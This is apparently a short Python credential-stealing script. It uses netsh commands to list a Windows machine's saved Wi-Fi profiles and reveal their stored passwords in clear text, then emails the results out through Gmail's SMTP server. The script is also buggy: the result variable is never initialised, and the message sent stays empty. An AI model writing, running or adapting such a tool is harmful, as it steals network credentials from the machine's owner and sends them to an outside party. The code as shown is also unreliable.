#!/usr/bin/env python

import subprocess
import smtplib
import re

message = None


def send_email(email, password, msg):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, msg)
    server.quit()


def exec_cmd():
    command = "netsh wlan show profile"
    networks = subprocess.check_output(command, shell=True)
    network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)

    for network in network_names:
        command = f"netsh wlan show profile {network} key=clear"
        curr_result = subprocess.check_output(command, shell=True)
        result += curr_result


exec_cmd()

send_email("email", "pass", message)
